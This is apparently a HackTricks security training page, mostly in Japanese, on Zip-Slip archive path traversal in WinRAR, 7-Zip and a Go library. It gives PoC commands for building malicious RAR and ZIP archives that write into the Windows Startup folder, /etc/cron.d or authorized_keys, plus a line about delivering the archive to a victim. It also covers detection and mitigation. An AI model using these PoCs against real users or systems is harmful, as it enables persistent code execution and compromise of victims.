# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概要

多くのアーカイブ形式（ZIP、RAR、TAR、7-ZIP など）は、各エントリに独自の **internal path** を持たせることができます。抽出ユーティリティがそのパスを無条件に尊重すると、作成されたファイル名に `..` や絶対パス（例: `C:\Windows\System32\`）が含まれている場合、ユーザが選んだディレクトリの外側に書き込まれてしまいます。
この種の脆弱性は *Zip-Slip* または **archive extraction path traversal** として広く知られています。

影響は任意のファイルの上書きから、Windows の *Startup* フォルダなどの **auto-run** な場所にペイロードを置くことで直接 **remote code execution (RCE)** を達成することまで及びます。

## 根本原因

1. 攻撃者がアーカイブを作成し、1つ以上のファイルヘッダに次のような内容を含める：
* 相対トラバーサルシーケンス（`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`）
* 絶対パス（`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`）
* あるいはターゲットディレクトリ外を指すように作られた **symlinks**（*nix* 系の ZIP/TAR で一般的）
2. 被害者が埋め込まれたパスを検証せず（または symlinks を追従して）信頼する脆弱なツールでアーカイブを展開し、抽出先を強制的に選択したディレクトリ配下に制限しない。
3. ファイルが攻撃者制御の場所に書き込まれ、システムやユーザがそのパスを次にトリガーしたときに実行／読み込まれる。

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows 用の WinRAR（`rar` / `unrar` CLI、DLL、ポータブルソースを含む）は、抽出時にファイル名の検証に失敗していました。
例えば次のようなエントリを含む悪意ある RAR アーカイブがありました：
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
選択した出力ディレクトリの**外側**に出て、ユーザーの*Startup*フォルダ内に配置されます。ログオン後、Windowsはそこにあるすべてを自動的に実行するため、*persistent* RCEが得られます。

### PoCアーカイブの作成 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Options used:
* `-ep`  – ファイルパスを与えられた通りに保存します（先頭の `./` を削除しないでください）。

Deliver `evil.rar` to the victim and instruct them to extract it with a vulnerable WinRAR build.

### Observed Exploitation in the Wild

ESET は、RAR アーカイブを添付して CVE-2025-8088 を悪用し、カスタマイズされたバックドアを展開しランサムウェア運用を支援する RomCom (Storm-0978/UNC2596) のスピアフィッシングキャンペーンを報告しました。

## Newer Cases (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP エントリが **symbolic links** の場合、展開時にデリファレンスされ、出力先ディレクトリから抜け出して任意のパスを上書きできました。ユーザー操作はアーカイブの「開く/展開する」だけで済みます。
* **Affected**: 7-Zip 21.02–24.09 (Windows & Linux builds)。**25.00**（2025年7月）以降で修正。
* **Impact path**: `Start Menu/Programs/Startup` やサービス実行場所を上書き → 次回ログオンやサービス再起動時にコードが実行されます。
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
パッチ済みビルドでは `/etc/cron.d` は触られず、シンボリックリンクは /tmp/target 内のリンクとして展開されます。

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` が `../` やシンボリックリンク化された ZIP エントリを追跡し、`outputDir` の外へ書き込んでしまう。
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1（プロジェクトは現在非推奨）。
* **Fix**: `mholt/archives` ≥ 0.1.0 に切り替えるか、書き込み前に正規化（canonical-path）チェックを実装する。
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – アーカイブのエントリを列挙し、`../`, `..\\`、*absolute paths*（`/`, `C:`）を含む名前、あるいは抽出先ディレクトリ外を指すタイプが *symlink* のエントリを検出フラグにする。
* **Canonicalisation** – `realpath(join(dest, name))` が依然として `dest` で始まることを確認する。そうでなければ拒否する。
* **Sandbox extraction** – 使い捨てのディレクトリに、安全な抽出ツール（例: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00）を使って展開し、生成されたパスがディレクトリ内に留まっているか検証する。
* **Endpoint monitoring** – WinRAR/7-Zip 等でアーカイブが開かれた直後に `Startup`/`Run`/`cron` の場所へ新しい実行ファイルが書き込まれた場合にアラートを上げる。

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ と 7-Zip 25.00+ はパス/シンボリックリンクのサニタイズを実装しています。両ツールとも自動更新は未対応のままです。
2. アーカイブを可能なら “**Do not extract paths**” / “**Ignore paths**” オプションで抽出する。
3. Unix では抽出前に権限を落とし、**chroot/namespace** をマウントする；Windows では **AppContainer** やサンドボックスを利用する。
4. カスタムコードを書く場合は、作成/書き込みを行う前に `realpath()`/`PathCanonicalize()` で正規化し、出力先を逸脱するエントリは拒否する。

## Additional Affected / Historical Cases

* 2018 – 多くの Java/Go/JS ライブラリに影響を与えた大規模な *Zip-Slip* 警告（Snyk）。
* 2023 – 7-Zip CVE-2023-4011：`-ao` マージ時の類似トラバーサル。
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) による slugs の TAR 抽出トラバーサル（v1.2 でパッチ）。
* PathCanonicalize / realpath を呼び出さないカスタム抽出ロジックは常にリスク。

## References

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
